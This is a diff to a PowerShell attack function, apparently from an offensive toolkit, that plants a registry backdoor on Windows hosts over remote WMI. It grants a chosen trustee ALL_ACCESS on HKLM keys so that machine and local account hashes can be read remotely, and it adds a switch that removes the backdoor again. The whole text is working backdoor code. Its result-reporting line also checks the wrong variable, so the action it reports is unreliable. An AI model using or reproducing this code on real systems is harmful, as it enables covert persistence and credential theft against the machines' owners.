@@ -46,6 +46,10 @@ Defaults to the localhost.
 Specifies the name ('DOMAIN\user') or the SID (S-1-...) of the trustee
 to add the backdoor for. Defaults to the current user.
 
+.PARAMETER Disable
+
+Switch to remove the backdoor from previous patched hostname.
+
 .PARAMETER Credential
 
 A [Management.Automation.PSCredential] object of alternate credentials
@@ -128,15 +132,20 @@ computer account hash and local account hashes.
         [String[]]
         $ComputerName = $Env:COMPUTERNAME,
 
+
         [Parameter(Position = 1)]
         [Alias('principal', 'user', 'sid')]
         [String]
         $Trustee = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name,
 
+        [Parameter(Position = 2)]
+        [Alias('remove')]
+        [Switch]
+        $Disable,
+
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $Credential = [Management.Automation.PSCredential]::Empty
-    )
+        $Credential = [Management.Automation.PSCredential]::Empty)
 
     ForEach ($Computer in $ComputerName) {
 
@@ -221,41 +230,54 @@ computer account hash and local account hashes.
 
             # first grab the existing security descriptor
             #   2147483650 = HKEY_LOCAL_MACHINE
+            
             $RegSD = $Reg.GetSecurityDescriptor(2147483650, $Key).Descriptor
-
-            Write-Verbose "[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"
-            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()
-            # 983103 == ALL_ACCESS
-            $RegAce.AccessMask = 983103
-            # 2 == OBJECT_INHERIT_ACE
-            $RegAce.AceFlags = 2
-            # 0x0 == 'Access Allowed'
-            $RegAce.AceType = 0x0
-
-            Write-Verbose "[$Computer : $Key] Creating the trustee WMI object with user '$User'"
-            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()
-            $RegTrustee.Name = $User
-            if ($Domain) {
-                $RegTrustee.Domain = $Domain
+            if($Disable)
+            {
+                $r = New-Object "System.Collections.Generic.List[System.Management.ManagementBaseObject]"
+                $RegSD.DACL | ForEach-Object{if($_.Trustee.Name -notlike $User) {$r.Add($_)}}
+                ([System.Management.ManagementBaseObject]$RegSD).SetPropertyValue("DACL", $r.ToArray())
+                $Null = $Reg.SetSecurityDescriptor(2147483650, $Key, $RegSD.PSObject.ImmediateBaseObject)
+                Write-Verbose "[$Computer : $Key] Backdooring Removed for key"
             }
+            else
+            {
+                Write-Verbose "[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"
+                $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()
+                # 983103 == ALL_ACCESS
+                $RegAce.AccessMask = 983103
+                # 2 == OBJECT_INHERIT_ACE
+                $RegAce.AceFlags = 2
+                # 0x0 == 'Access Allowed'
+                $RegAce.AceType = 0x0
 
-            Write-Verbose "[$Computer : $Key] Applying Trustee to new Ace"
-            $RegAce.Trustee = $RegTrustee
+                Write-Verbose "[$Computer : $Key] Creating the trustee WMI object with user '$User'"
+                $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()
+                $RegTrustee.Name = $User
+                if ($Domain) {
+                    $RegTrustee.Domain = $Domain
+                }
+     
+                Write-Verbose "[$Computer : $Key] Applying Trustee to new Ace"
+                $RegAce.Trustee = $RegTrustee
+     
+                # add the new ACE to the retrieved security descriptor
+                $RegSD.DACL += $RegAce.PSObject.ImmediateBaseObject
 
-            # add the new ACE to the retrieved security descriptor
-            $RegSD.DACL += $RegAce.PSObject.ImmediateBaseObject
+                Write-Verbose "[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace"
+                $Null = $Reg.SetSecurityDescriptor(2147483650, $Key, $RegSD.PSObject.ImmediateBaseObject)
 
-            Write-Verbose "[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace"
-            $Null = $Reg.SetSecurityDescriptor(2147483650, $Key, $RegSD.PSObject.ImmediateBaseObject)
-
-            Write-Verbose "[$Computer : $Key] Backdooring completed for key"
+                Write-Verbose "[$Computer : $Key] Backdooring completed for key"
+            }
         }
 
-        Write-Verbose "[$Computer] Backdooring completed for system"
+        Write-Verbose "[$Computer] Backdooring patch was completed for system"
+        if($remove){$Action = "Removed"}else{$Action = "Added"}
 
         $Out = New-Object PSObject  
         $Out | Add-Member Noteproperty 'ComputerName' $Computer
         $Out | Add-Member Noteproperty 'BackdoorTrustee' $Trustee
+        $Out | Add-Member Noteproperty 'Action' $action 
         $Out
     }
 }
